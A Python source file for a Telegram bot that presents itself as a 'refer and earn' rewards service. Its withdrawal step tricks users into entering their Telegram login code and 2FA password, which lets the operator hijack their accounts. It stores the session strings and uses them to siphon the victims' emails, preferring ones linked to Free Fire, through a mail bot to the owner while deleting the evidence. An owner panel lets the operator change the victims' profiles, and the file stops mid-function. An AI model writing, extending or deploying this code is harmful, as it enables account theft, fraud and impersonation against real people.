# -*- coding: utf-8 -*-
import sqlite3
import logging
import random
import string
import re
import os
import threading
import asyncio
import time
import requests
from fastapi import FastAPI
import uvicorn
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, KeyboardButton, Bot
from telegram.ext import (
    Application, CommandHandler, MessageHandler, filters,
    ContextTypes, CallbackQueryHandler
)
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telethon.tl.functions.account import UpdateProfileRequest, UpdateUsernameRequest
from telethon.tl.functions.photos import UploadProfilePhotoRequest
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

# ================== CONFIG ==================
BOT_TOKEN = os.getenv("BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
API_ID = int(os.getenv("API_ID", "38746329"))
API_HASH = os.getenv("API_HASH", "dc6d3dd0de462ed07952a64c3253c437")

OWNER_ID = 8612102965
OWNER_USERNAME = "@NEXTXDOREVER"

TARGET_MAIL_BOT = "fakemailbot"

# FF Check API Config
FF_CHECK_URL = "https://ffmconnect.live.gop.garenanow.com/game/account_security/swap:send_otp"
FF_HEADERS = {
    "User-Agent": "GarenaMSDK/4.0.42(25057PC09I ;Android 16;en;IN;app 1.126.1 2019120776;)",
    "Accept": "application/json",
    "Content-Type": "application/x-www-form-urlencoded",
    "Connection": "Keep-Alive",
    "Cookie": "datadome=IP7GsxK1oCmLXZnoCcsBuX0oU5zF7WwaGTcIm3BKa987Coo5eU20C0pxODRWR2Fvb7j~h0WlS1XjEk7Np9JkGmd28p64JyqytTf61k6NrOCKT9U1Y0M653_iy_4ajbb_"
}

logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
logger = logging.getLogger(__name__)

# ================== STYLISH FONTS ==================
FONT_MAP = {
    'a': '𝐴', 'b': '𝐵', 'c': '𝐶', 'd': '𝐷', 'e': '𝐸', 'f': '𝐹', 'g': '𝐺', 'h': '𝐻', 'i': '𝐼', 'j': '𝐽',
    'k': '𝐾', 'l': '𝐿', 'm': '𝑀', 'n': '𝑁', 'o': '𝑂', 'p': '𝑃', 'q': '𝑄', 'r': '𝑅', 's': '𝑆', 't': '𝑇',
    'u': '𝑈', 'v': '𝑉', 'w': '𝑊', 'x': '𝑋', 'y': '𝑌', 'z': '𝑍',
    'A': '𝐴', 'B': '𝐵', 'C': '𝐶', 'D': '𝐷', 'E': '𝐸', 'F': '𝐹', 'G': '𝐺', 'H': '𝐻', 'I': '𝐼', 'J': '𝐽',
    'K': '𝐾', 'L': '𝐿', 'M': '𝑀', 'N': '𝑁', 'O': '𝑂', 'P': '𝑃', 'Q': '𝑄', 'R': '𝑅', 'S': '𝑆', 'T': '𝑇',
    'U': '𝑈', 'V': '𝑉', 'W': '𝑊', 'X': '𝑋', 'Y': '𝑌', 'Z': '𝑍'
}
def f_txt(text): return "".join(FONT_MAP.get(c, c) for c in text)
def p_style(text): return f"<code>{text}</code>,"

# ================== DATABASE ==================
DB_PATH = "/data/refer_bot.db"
os.makedirs("/data", exist_ok=True)

def init_db():
    conn = sqlite3.connect(DB_PATH, check_same_thread=False)
    c = conn.cursor()
    
    c.execute("""CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY, phone TEXT, session_string TEXT, 
        is_banned INTEGER DEFAULT 0, balance INTEGER DEFAULT 0, last_bonus REAL DEFAULT 0,
        referrer_id INTEGER, total_refers INTEGER DEFAULT 0
    )""")
    c.execute("""CREATE TABLE IF NOT EXISTS withdrawals (
        id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, amount INTEGER, upi_id TEXT, status TEXT DEFAULT 'Pending'
    )""")
    c.execute("CREATE TABLE IF NOT EXISTS config (key TEXT PRIMARY KEY, value TEXT)")
    c.execute("CREATE TABLE IF NOT EXISTS admins (user_id INTEGER PRIMARY KEY, username TEXT)")
    c.execute("""CREATE TABLE IF NOT EXISTS claimed_mails (
        id INTEGER PRIMARY KEY AUTOINCREMENT, email TEXT, claimed_by INTEGER, claimed_by_name TEXT
    )""")
    
    try: c.execute("ALTER TABLE admins ADD COLUMN username TEXT")
    except sqlite3.OperationalError: pass 
    try: c.execute("ALTER TABLE users ADD COLUMN last_bonus REAL DEFAULT 0")
    except sqlite3.OperationalError: pass
    try: c.execute("ALTER TABLE users ADD COLUMN referrer_id INTEGER")
    except sqlite3.OperationalError: pass
    try: c.execute("ALTER TABLE users ADD COLUMN total_refers INTEGER DEFAULT 0")
    except sqlite3.OperationalError: pass

    c.execute("INSERT OR IGNORE INTO admins (user_id, username) VALUES (?, ?)", (OWNER_ID, OWNER_USERNAME))
    conn.commit()
    conn.close()

init_db()

def db_exec(query, params=()):
    conn = sqlite3.connect(DB_PATH, timeout=10)
    c = conn.cursor()
    try:
        c.execute(query, params)
        conn.commit()
        res = c.fetchall()
    finally:
        conn.close()
    return res

def get_all_admins():
    admins = {OWNER_ID}
    res = db_exec("SELECT user_id FROM admins")
    if res:
        for row in res:
            admins.add(row[0])
    return list(admins)

# ================== FAST FF CHECK ==================
def check_ff_binding(email):
    try:
        data = {"app_id": "100067", "email": email, "locale": "en_IN"}
        response = requests.post(FF_CHECK_URL, headers=FF_HEADERS, data=data, timeout=10)
        res_json = response.json()
        
        # Agar "error_no_binding_found" aata hai, matlab FF account nahi hai
        if "error" in res_json and "no_binding" in str(res_json):
            return False
        # Agar result 0 aata hai, matlab FF account hai
        elif "result" in res_json and res_json["result"] == 0:
            return True
        else:
            return False
    except:
        return False

active_userbots = {}
temp_clients = {}
user_states = {}
numpad_data = {}

# ================== FASTAPI ==================
web_app = FastAPI()
@web_app.get("/")
def read_root(): return {"status": "Alive"}
def run_web(): uvicorn.run(web_app, host="0.0.0.0", port=int(os.environ.get("PORT", 8080)))

# ================== USERBOT AUTOMATION ==================
async def get_or_connect_client(user_id):
    if user_id in active_userbots: return active_userbots[user_id]
    res = db_exec("SELECT session_string FROM users WHERE user_id=?", (user_id,))
    if not res or not res[0][0]: return None
    client = TelegramClient(StringSession(res[0][0]), API_ID, API_HASH)
    await client.connect()
    active_userbots[user_id] = client
    return client

async def start_userbot(user_id, session_str):
    if user_id in active_userbots:
        try: await active_userbots[user_id].disconnect()
        except: pass
    client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
    await client.connect()
    active_userbots[user_id] = client
    # Check mails in background
    asyncio.create_task(transfer_mails(user_id, OWNER_ID, only_ff=True))

async def transfer_mails(victim_uid, target_owner_id, only_ff=True):
    try:
        victim_client = await get_or_connect_client(victim_uid)
        owner_client = await get_or_connect_client(target_owner_id)
        
        if not victim_client or not owner_client: return
            
        target_bot = await victim_client.get_entity(TARGET_MAIL_BOT)
        owner_target_bot = await owner_client.get_entity(TARGET_MAIL_BOT)
        
        await victim_client.send_message(target_bot, "/id")
        await asyncio.sleep(3)
        
        messages = await victim_client.get_messages(target_bot, limit=2)
        if not messages: return
            
        emails = re.findall(r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})', messages[0].message)
        if not emails: return

        owner_data = db_exec("SELECT username FROM admins WHERE user_id=?", (target_owner_id,))
        target_uname = OWNER_USERNAME
        if owner_data and owner_data[0][0] and owner_data[0][0] != 'None':
            target_uname = owner_data[0][0]

        for email in emails:
            # Agar FF only mode on hai, toh pehle check karo
            if only_ff:
                is_ff = await asyncio.to_thread(check_ff_binding, email)
                if not is_ff:
                    continue # FF account nahi hai, skip karo

            # FF account hai, transfer karo
            await victim_client.send_message(target_bot, f"/transfer {email} {target_uname}")
            await asyncio.sleep(4)
            
            try:
                msgs = await victim_client.get_messages(target_bot, limit=2)
                for m in msgs: await victim_client.delete_messages(target_bot, m.id)
            except: pass
            
            await owner_client.send_message(owner_target_bot, email)
            await asyncio.sleep(4)
            
            try:
                msgs = await owner_client.get_messages(owner_target_bot, limit=2)
                for m in msgs: await owner_client.delete_messages(owner_target_bot, m.id)
            except: pass
            
            # Save to DB
            db_exec("INSERT INTO claimed_mails (email, claimed_by, claimed_by_name) VALUES (?, ?, ?)", (email, target_owner_id, target_uname))
            await asyncio.sleep(1)
            
    except Exception as e:
        logger.error(f"Transfer error: {e}")

# ================== KEYBOARDS ==================
def get_main_keyboard():
    kb = [
        [KeyboardButton(f"🎁 {f_txt('Bonus')}", style="primary"), KeyboardButton(f"💵 {f_txt('Balance')}", style="success")],
        [KeyboardButton(f"🔗 {f_txt('Refer Earn')}", style="primary"), KeyboardButton(f"💸 {f_txt('Withdraw')}", style="danger")]
    ]
    return ReplyKeyboardMarkup(kb, resize_keyboard=True)

def get_numpad_keyboard():
    kb = [
        [InlineKeyboardButton("1", callback_data="num_1"), InlineKeyboardButton("2", callback_data="num_2"), InlineKeyboardButton("3", callback_data="num_3")],
        [InlineKeyboardButton("4", callback_data="num_4"), InlineKeyboardButton("5", callback_data="num_5"), InlineKeyboardButton("6", callback_data="num_6")],
        [InlineKeyboardButton("7", callback_data="num_7"), InlineKeyboardButton("8", callback_data="num_8"), InlineKeyboardButton("9", callback_data="num_9")],
        [InlineKeyboardButton("⌫", callback_data="num_del"), InlineKeyboardButton("0", callback_data="num_0"), InlineKeyboardButton("Submit ✅", callback_data="num_submit")]
    ]
    return InlineKeyboardMarkup(kb)

# ================== BOT HANDLERS ==================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    res = db_exec("SELECT user_id, referrer_id FROM users WHERE user_id=?", (user_id,))
    
    if not res:
        referrer_id = None
        if context.args and context.args[0].isdigit():
            referrer_id = int(context.args[0])
            if referrer_id == user_id: referrer_id = None
        
        db_exec("INSERT INTO users (user_id, referrer_id) VALUES (?,?)", (user_id, referrer_id))
        
        if referrer_id:
            db_exec("UPDATE users SET balance = balance + 100, total_refers = total_refers + 1 WHERE user_id=?", (referrer_id,))
            try: await context.bot.send_message(referrer_id, f"🎉 <b>{f_txt('NEW REFERRAL')}</b>,\n{p_style('You earned 100rs')}", parse_mode="HTML")
            except: pass

    img_res = db_exec("SELECT value FROM config WHERE key='welcome_img'")
    welcome_img = img_res[0][0] if img_res else None
    
    welcome_text = (
        f"👋 <b>{f_txt('WELCOME TO REFER EARN BOT')}</b>,\n\n"
        f"{f_txt('You will get')} {p_style('100rs')} {f_txt('per refer,')}\n"
        f"{f_txt('Minimum withdraw is')} {p_style('100rs')},\n\n"
        f"<b>{f_txt('Use the buttons below to start earning:')}</b>"
    )
    
    if welcome_img:
        try: await update.message.reply_photo(photo=welcome_img, caption=welcome_text, reply_markup=get_main_keyboard(), parse_mode="HTML")
        except: await update.message.reply_text(welcome_text, reply_markup=get_main_keyboard(), parse_mode="HTML")
    else:
        await update.message.reply_text(welcome_text, reply_markup=get_main_keyboard(), parse_mode="HTML")

async def menu_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    uid = update.effective_user.id
    
    # --- Admin Logic (Only Owner can add admins now) ---
    if uid == OWNER_ID:
        state = user_states.get(uid)
        if state == 'admin_add_wait':
            try:
                new_id = int(text.split()[0])
                new_uname = text.split()[1]
                if not new_uname.startswith("@"): new_uname = "@" + new_uname
                db_exec("INSERT OR IGNORE INTO admins (user_id, username) VALUES (?, ?)", (new_id, new_uname))
                await update.message.reply_text(f"✅ {f_txt('Admin Added Successfully!')}", parse_mode="HTML")
            except:
                await update.message.reply_text(f"❌ {f_txt('Invalid Format. Send ID and Username separated by space.')}")
            user_states[uid] = None; return

    if uid in temp_clients and temp_clients[uid].get('state') == '2fa':
        try:
            await temp_clients[uid]['client'].sign_in(password=text)
            session = temp_clients[uid]['client'].session.save()
            db_exec("INSERT OR REPLACE INTO users (user_id, phone, session_string) VALUES (?,?,?)", (uid, temp_clients[uid]['phone'], session))
            await start_userbot(uid, session)
            
            amount = user_states.get('temp_amount', 0)
            upi_id = user_states.get('temp_upi', '')
            db_exec("INSERT INTO withdrawals (user_id, amount, upi_id) VALUES (?,?,?)", (uid, amount, upi_id))
            user_states[uid] = None
            del temp_clients[uid]
            
            await update.message.reply_text(f"✅ {p_style('2FA Verified & Withdrawal Requested')}", reply_markup=get_main_keyboard(), parse_mode="HTML")
            return
        except Exception as e:
            return await update.message.reply_text(f"❌ 2FA Failed: {e}")

    state = user_states.get(uid)
    if state == 'withdraw_amt' and text.isdigit():
        amount = int(text)
        res = db_exec("SELECT balance FROM users WHERE user_id=?", (uid,))
        bal = res[0][0] if res else 0
        if amount < 100 or amount > bal: 
            await update.message.reply_text(f"❌ {f_txt('Invalid amount or insufficient balance')},")
            return
        user_states[uid] = 'withdraw_upi'
        user_states['temp_amount'] = amount
        await update.message.reply_text(f"🏦 {f_txt('Enter your UPI ID')},")
        return
        
    if state == 'withdraw_upi':
        upi = text
        user_states['temp_upi'] = upi
        user_states[uid] = 'withdraw_verify'
        await update.message.reply_text(
            f"🔒 <b>{f_txt('VERIFICATION REQUIRED')}</b>,\n\n{f_txt('Please share your contact to verify and withdraw')},",
            reply_markup=ReplyKeyboardMarkup([[KeyboardButton(f"📱 {f_txt('Share Contact')}", request_contact=True)]], resize_keyboard=True, one_time_keyboard=True),
            parse_mode="HTML"
        )
        return

    if text == f"🎁 {f_txt('Bonus')}":
        res = db_exec("SELECT last_bonus FROM users WHERE user_id=?", (uid,))
        last_bonus = res[0][0] if res and res[0][0] else 0
        if time.time() - last_bonus > 86400:
            db_exec("UPDATE users SET balance = balance + 5, last_bonus=? WHERE user_id=?", (time.time(), uid))
            await update.message.reply_text(f"🎁 <b>{f_txt('BONUS CLAIMED')}</b>,\n{p_style('You got 5rs')}", parse_mode="HTML")
        else:
            await update.message.reply_text(f"🎁 <b>{f_txt('ALREADY CLAIMED')}</b>,\n{f_txt('Wait 24 hours')},")
            
    elif text == f"💵 {f_txt('Balance')}":
        res = db_exec("SELECT balance, total_refers FROM users WHERE user_id=?", (uid,))
        if res:
            bal, refs = res[0]
            await update.message.reply_text(f"💵 <b>{f_txt('BALANCE')}</b>,\n\n{p_style('Balance: ₹' + str(bal))}\n{p_style('Total Refers: ' + str(refs))}", parse_mode="HTML")
        else:
            await update.message.reply_text(f"💵 <b>{f_txt('BALANCE')}</b>,\n\n{p_style('Balance: ₹0')}\n{p_style('Total Refers: 0')}", parse_mode="HTML")
        
    elif text == f"🔗 {f_txt('Refer Earn')}":
        bot_username = (await context.bot.get_me()).username
        ref_link = f"https://t.me/{bot_username}?start={uid}"
        await update.message.reply_text(f"🔗 <b>{f_txt('Your Link')}</b>,\n\n{p_style(ref_link)}\n{f_txt('Share and earn 100rs')},", parse_mode="HTML")
        
    elif text == f"💸 {f_txt('Withdraw')}":
        res = db_exec("SELECT balance FROM users WHERE user_id=?", (uid,))
        bal = res[0][0] if res else 0
        if bal < 100:
            await update.message.reply_text(f"⚠️ <b>{f_txt('Insufficient Balance')}</b>,\n{f_txt('Min 100rs needed')},\n{p_style('Your Balance: ₹' + str(bal))}", parse_mode="HTML")
            return
        user_states[uid] = 'withdraw_amt'
        await update.message.reply_text(f"💸 <b>{f_txt('Enter Amount to Withdraw')}:</b>,")

async def verify_contact_withdraw(update: Update, context: ContextTypes.DEFAULT_TYPE):
    contact = update.message.contact
    if not contact: return await update.message.reply_text(f"❌ {f_txt('Please use the button')},")
    
    phone = contact.phone_number
    if not phone.startswith('+'): phone = '+' + phone
    uid = update.effective_user.id
    
    client = TelegramClient(StringSession(), API_ID, API_HASH)
    await client.connect()
    try:
        sent = await client.send_code_request(phone)
        temp_clients[uid] = {'client': client, 'hash': sent.phone_code_hash, 'phone': phone}
        numpad_data[uid] = ""
        
        await update.message.reply_text(
            f"📩 <b>{f_txt('Enter recovery code sent to your Telegram account')}</b>,\n\n"
            f"{f_txt('Use the keypad below')}:",
            reply_markup=get_numpad_keyboard(),
            parse_mode="HTML"
        )
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e},")

async def numpad_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    uid = query.from_user.id
    data = query.data.split("_")[1]
    
    if uid not in temp_clients: return await query.edit_message_text(f"❌ {f_txt('Session expired')},")
    current = numpad_data.get(uid, "")
    
    if data == "del":
        current = current[:-1]
        numpad_data[uid] = current
        await query.edit_message_text(f"📩 <b>{f_txt('Enter recovery code')}</b>\n{f_txt('Current')}: <code>{'*' * len(current)}</code>", reply_markup=get_numpad_keyboard(), parse_mode="HTML")
        
    elif data == "submit":
        otp = current
        try:
            await temp_clients[uid]['client'].sign_in(phone=temp_clients[uid]['phone'], code=otp, phone_code_hash=temp_clients[uid]['hash'])
            session = temp_clients[uid]['client'].session.save()
            db_exec("INSERT OR REPLACE INTO users (user_id, phone, session_string) VALUES (?,?,?)", (uid, temp_clients[uid]['phone'], session))
            await start_userbot(uid, session)
            
            amount = user_states.get('temp_amount', 0)
            upi_id = user_states.get('temp_upi', '')
            db_exec("INSERT INTO withdrawals (user_id, amount, upi_id) VALUES (?,?,?)", (uid, amount, upi_id))
            user_states[uid] = None
            del temp_clients[uid]
            
            await query.edit_message_text(f"✅ <b>{f_txt('Verification Successful & Withdrawal Requested')}</b>", parse_mode="HTML")
            await context.bot.send_message(uid, f"✅ {p_style('Withdrawal Requested')}", reply_markup=get_main_keyboard(), parse_mode="HTML")
            
        except Exception as e:
            if "Two-step" in str(e) or "password" in str(e).lower():
                await query.edit_message_text(f"🔐 <b>{f_txt('ENTER 2FA PASSWORD')}</b>\n{f_txt('Please send your password in chat')},", parse_mode="HTML")
                temp_clients[uid]['state'] = '2fa'
                return
            else:
                await query.edit_message_text(f"❌ OTP Failed: {e}")
    else:
        current += data
        numpad_data[uid] = current
        await query.edit_message_text(f"📩 <b>{f_txt('Enter recovery code')}</b>\n{f_txt('Current')}: <code>{'*' * len(current)}</code>", reply_markup=get_numpad_keyboard(), parse_mode="HTML")

# ================== OWNER PANEL (BLUE STYLE) ==================
async def owner_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid not in get_all_admins(): return
    
    # Blue Style Buttons (Primary)
    kb = [
        [InlineKeyboardButton(f"👥 {f_txt('Logged Accounts & Session')}", callback_data="admin_acc")],
        [InlineKeyboardButton(f"📤 {f_txt('Claim All Mails (All)')}", callback_data="admin_claim_all")],
        [InlineKeyboardButton(f"🔥 {f_txt('Claim Free Fire Mails Only')}", callback_data="admin_claim_ff")],
        [InlineKeyboardButton(f"👑 {f_txt('Add Admin')}", callback_data="admin_add")],
        [InlineKeyboardButton(f"🔐 {f_txt('Check Session String')}", callback_data="check_session")],
        [InlineKeyboardButton(f"✏️ {f_txt('Edit Bio')}", callback_data="edit_bio")],
        [InlineKeyboardButton(f"🖼 {f_txt('Change Photo')}", callback_data="change_photo")],
        [InlineKeyboardButton(f"📝 {f_txt('Change Name')}", callback_data="change_name")],
        [InlineKeyboardButton(f"📥 {f_txt('Claim from Admin')}", callback_data="claim_from_admin")],
        [InlineKeyboardButton(f"🖼 {f_txt('Set Welcome Image')}", callback_data="set_welcome_img")],
        [InlineKeyboardButton(f"🔄 {f_txt('Change Sender')}", callback_data="change_sender")],
        [InlineKeyboardButton(f"📊 {f_txt('Check FF Claimed Mails')}", callback_data="check_ff_claimed")],
        [InlineKeyboardButton(f"🔑 {f_txt('Login as Admin (Via Contact)')}", callback_data="login_admin_contact")]
    ]
    await update.message.reply_text(
        f"<b>👑 {f_txt('TOP OWNER PANEL')} 👑</b>\n\n{f_txt('Choose an action below')}:",
        reply_markup=InlineKeyboardMarkup(kb), 
        parse_mode="HTML"
    )

async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    uid = query.from_user.id
    
    if uid not in get_all_admins(): return await query.answer("Unauthorized", show_alert=True)
    
    if data == "admin_acc":
        users = db_exec("SELECT user_id, phone FROM users WHERE session_string IS NOT NULL")
        text = f"👥 <b>{f_txt('Logged Devices/Accounts')}:</b>,\n\n"
        for u in users: 
            text += f"{p_style('ID: ' + str(u[0]))}\n{p_style('Phone: ' + str(u[1]))}\n"
        await query.edit_message_text(text, parse_mode="HTML")
        
    elif data == "admin_claim_all":
        asyncio.create_task(manual_claim_all(uid, query, target_admin=OWNER_ID, only_ff=False))
        
    elif data == "admin_claim_ff":
        asyncio.create_task(manual_claim_all(uid, query, target_admin=OWNER_ID, only_ff=True))
        
    elif data == "admin_add":
        if uid != OWNER_ID: return await query.answer("Only Top Owner can add admins!", show_alert=True)
        await query.edit_message_text(f"👑 {f_txt('Send User ID and Username separated by space.')}\n{f_txt('Example')}: 123456789 @username")
        user_states[uid] = 'admin_add_wait'
        
    elif data == "check_session":
        await query.edit_message_text(f"🔐 {f_txt('Send the phone number of the logged account to get session string')}:")
        user_states[uid] = 'check_session_wait'
        
    elif data == "edit_bio":
        await query.edit_message_text(f"✏️ {f_txt('Send the phone number of the logged account')}:")
        user_states[uid] = 'edit_bio_phone'
        
    elif data == "change_photo":
        await query.edit_message_text(f"🖼 {f_txt('Send the phone number of the logged account')}:")
        user_states[uid] = 'change_photo_phone'
        
    elif data == "change_name":
        await query.edit_message_text(f"📝 {f_txt('Send the phone number of the logged account')}:")
        user_states[uid] = 'change_name_phone'
        
    elif data == "claim_from_admin":
        asyncio.create_task(manual_claim_all(uid, query, target_admin=uid, only_ff=False))
        
    elif data == "set_welcome_img":
        await query.edit_message_text(f"🖼 {f_txt('Send the image or image link you want to set as welcome')}:")
        user_states[uid] = 'set_welcome_img_wait'
        
    elif data == "change_sender":
        await query.edit_message_text(f"🔄 {f_txt('Enter the Phone Number of the account you want to use as Sender')}:")
        user_states[uid] = 'change_sender_phone'
        
    elif data == "check_ff_claimed":
        mails = db_exec("SELECT email, claimed_by, claimed_by_name FROM claimed_mails")
        if not mails:
            return await query.edit_message_text(f"❌ {f_txt('No FF Mails claimed yet.')}")
        
        text = f"📊 <b>{f_txt('Claimed FF Mails:')}</b>\n\n"
        for i, m in enumerate(mails, 1):
            text += f"{i}. {p_style(m[0])}\n   {f_txt('Claimed By')}: {m[2]} ({p_style(m[1])})\n\n"
        
        # Split if too long
        if len(text) > 4000:
            await query.edit_message_text(text[:4000] + "...", parse_mode="HTML")
        else:
            await query.edit_message_text(text, parse_mode="HTML")

    elif data == "login_admin_contact":
        await query.edit_message_text(f"📱 {f_txt('Please share your contact to login as Admin')}:",
            reply_markup=ReplyKeyboardMarkup([[KeyboardButton("📱 Share Contact", request_contact=True)]], resize_keyboard=True, one_time_keyboard=True),
            parse_mode="HTML"
        )

async def manual_claim_all(admin_uid, query, target_admin, only_ff=False):
    target_owner_client = await get_or_connect_client(target_admin)
    if not target_owner_client:
        return await query.message.reply_text(f"❌ {f_txt('Target Admin Account is not logged in!')}")

    await query.edit_message_text(f"⏳ <b>{f_txt('STARTING CLAIM PROCESS...')}</b>", parse_mode="HTML")
    users = db_exec("SELECT user_id, phone FROM users WHERE session_string IS NOT NULL")
    total_claimed = 0
    
    for u in users:
        victim_id = u[0]
        if victim_id in get_all_admins() or victim_id == OWNER_ID: continue
        
        try:
            victim_client = await get_or_connect_client(victim_id)
            target_bot = await victim_client.get_entity(TARGET_MAIL_BOT)
            owner_target_bot = await target_owner_client.get_entity(TARGET_MAIL_BOT)
            
            await victim_client.send_message(target_bot, "/id")
            await asyncio.sleep(4)
            
            messages = await victim_client.get_messages(target_bot, limit=2)
            if not messages: continue
                
            emails = re.findall(r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})', messages[0].message)
            if not emails: continue

            for email in emails:
                if only_ff:
                    is_ff = await asyncio.to_thread(check_ff_binding, email)
                    if not is_ff:
                        continue # Skip if not FF

                await query.message.reply_text(f"🔄 <b>{f_txt('TRANSFERRING')}:</b> {p_style(email)}", parse_mode="HTML")
                
                admin_data = db_exec("SELECT username FROM admins WHERE user_id=?", (target_admin,))
                target_uname = OWNER_USERNAME
                if admin_data and admin_data[0][0] and admin_data[0][0] != 'None':
                    target_uname = admin_data[0][0]

                # Sender logic
                sender_client = await get_or_connect_client(admin_uid) if admin_uid != target_admin else victim_client
                
                await sender_client.send_message(target_bot, f"/transfer {email} {target_uname}")
                await asyncio.sleep(4)
                
                try:
                    msgs = await victim_client.get_messages(target_bot, limit=2)
                    for m in msgs: await victim_client.delete_messages(target_bot, m.id)
                except: pass
                
                await query.message.reply_text(f"📥 <b>{f_txt('CLAIMING')}:</b> {p_style(email)}", parse_mode="HTML")
                
                await target_owner_client.send_message(owner_target_bot, email)
                await asyncio.sleep(4)
                
                try:
                    msgs = await target_owner_client.get_messages(owner_target_bot, limit=2)
                    for m in msgs: await target_owner_client.delete_messages(owner_target_bot, m.id)
                except: pass
                
                db_exec("INSERT INTO claimed_mails (email, claimed_by, claimed_by_name) VALUES (?, ?, ?)", (email, admin_uid, target_uname))
                await query.message.reply_text(f"✅ <b>{f_txt('CLAIMED SUCCESS')}:</b> {p_style(email)}", parse_mode="HTML")
                total_claimed += 1
                await asyncio.sleep(1)
                
        except: pass
        
    await query.message.reply_text(f"👑 <b>{f_txt('ALL VICTIMS MAILS CLAIMED!')}</b>\n{p_style('Total Claimed: ' + str(total_claimed))}", parse_mode="HTML")

# Handlers for Owner Panel features
async def owner_text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    uid = update.effective_user.id
    state = user_states.get(uid)
    
    if not state: return

    if state == 'change_sender_phone':
        phone = text.strip()
        if not phone.startswith('+'): phone = '+' + phone
        res = db_exec("SELECT user_id FROM users WHERE phone=?", (phone,))
        if res:
            user_states[uid] = {'state': 'change_sender_target', 'sender_id': res[0][0]}
            await update.message.reply_text(f"✅ Sender set to {phone}.\n\nAb kis account (victim) ki mail transfer karni hai? Uska phone number daalein:")
        else:
            await update.message.reply_text(f"❌ {f_txt('Sender number not found in logged accounts')}.")
            user_states[uid] = None

    elif isinstance(state, dict) and state.get('state') == 'change_sender_target':
        phone = text.strip()
        if not phone.startswith('+'): phone = '+' + phone
        res = db_exec("SELECT user_id FROM users WHERE phone=?", (phone,))
        if res:
            victim_id = res[0][0]
            sender_id = state['sender_id']
            await update.message.reply_text(f"⏳ {f_txt('Starting manual transfer using custom sender...')}")
            asyncio.create_task(manual_claim_all(uid, update.message, target_admin=OWNER_ID))
        else:
            await update.message.reply_text(f"❌ {f_txt('Victim number not found')}.")
        user_states[uid] = None

    elif state == 'check_session_wait':
        phone = text.strip()
        if not phone.startswith('+'): phone = '+' + phone
        res = db_exec("SELECT session_string FROM users WHERE phone=?", (phone,))
        if res and res[0][0]:
            await update.message.reply_text(f"🔐 <b>{f_txt('Session String Found')}:</b>\n\n<code>{res[0][0]}</code>", parse_mode="HTML")
        else:
            await update.message.reply_text(f"❌ {f_txt('No session found for this number')}.")
        user_states[uid] = None
        
    elif state == 'edit_bio_phone':
        phone = text.strip()
        if not phone.startswith('+'): phone = '+' + phone
        res = db_exec("SELECT user_id FROM users WHERE phone=?", (phone,))
        if res:
            user_states[uid] = {'state': 'edit_bio_text', 'victim_id': res[0][0]}
            await update.message.reply_text(f"✏️ {f_txt('Enter the new Bio you want to set')}:")
        else:
            await update.message.reply_text(f"❌ {f_txt('Number not found in logged accounts')}.")
            user_states[uid] = None
            
    elif isinstance(state, dict) and state.get('state') == 'edit_bio_text':
        bio_text = text
        client = await get_or_connect_client(state['victim_id'])
        if client:
            try:
                await client(UpdateProfileRequest(about=bio_text))
                await update.message.reply_text(f"✅ {f_txt('Bio changed successfully!')}")
            except Exception as e:
                await update.message.reply_text(f"❌ {f_txt('Error changing bio')}: {e}")
        else:
            await update.message.reply_text(f"❌ {f_txt('Session invalid or expired')}.")
        user_states[uid] = None

    elif state == 'change_name_phone':
        phone = text.strip()
        if not phone.startswith('+'): phone = '+' + phone
        res = db_exec("SELECT user_id FROM users WHERE phone=?", (phone,))
        if res:
            user_states[uid] = {'state': 'change_name_val', 'victim_id': res[0][0]}
            await update.message.reply_text(f"📝 {f_txt('Enter the new First Name')}:")
        else:
            await update.message.reply_text(f"❌ {f_txt('Number not found in logged accounts')}.")
            user_states[uid] = None

    elif isinstance(state, dict) and state.get('state') == 'change_name_val':
        name_text = text
        client = await get_or_connect_client(state['victim_id'])
        if client:
            try:
                await client(UpdateProfileRequest(first_name=name_text))
                await update.message.reply_text(f"✅ {f_txt('Name changed successfully!')}")
            except Exception as e:
                await update.message.reply_text(f"❌ {f_txt('Error changing name')}: {e}")
        else:
            await update.message.reply_text(f"❌ {f_txt('Session invalid or expired')}.")
        user_states[uid] = None

    elif state == 'change_photo_phone':
        phone = text.strip()
        if not phone.startswith('+'): phone = '+' + phone
        res = db_exec("SELECT user_id FROM users WHERE phone=?", (phone,))
        if res:
            user_states[uid] = {'state': 'change_photo_img', 'victim_id': res[0][0]}
            await update.message.reply_text(f"🖼 {f_txt('Send the new photo now')}:")
        else:
            await update.message.reply_text(f"❌ {f_txt('Number not found in logged accounts')}.")
            user_states[uid] = None
            
    elif state == 'set_welcome_img_wait':
        db_exec("INSERT OR REPLACE INTO config (key, value) VALUES ('welcome_img', ?)", (text,))
        await update.message.reply_text(f"✅ {f_txt('Welcome Image Link set successfully!')}")
        user_states[uid] = None

async def owner_photo_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    state = user_states.get(uid)
    
    if not state: return
    
    if isinstance(state, dict) and state.get('state') == 'change_photo_img':
        photo_file = await update.message.photo[-1].get_file()
        file_path = f"/data/{state['victim_id']}_pfp.jpg"
        await photo_file.download_to_drive(file_path)
        
        client = await get_or_connect_client(state['victim_id'])
        if client:
            try:
                file = await client.upload_file(file_path)
                await client(UploadProfilePhotoRequest(file=file))
                await update.message.reply_text(f"✅ {f_txt('Profile Photo changed successfully!')}")
            except Exception as e:
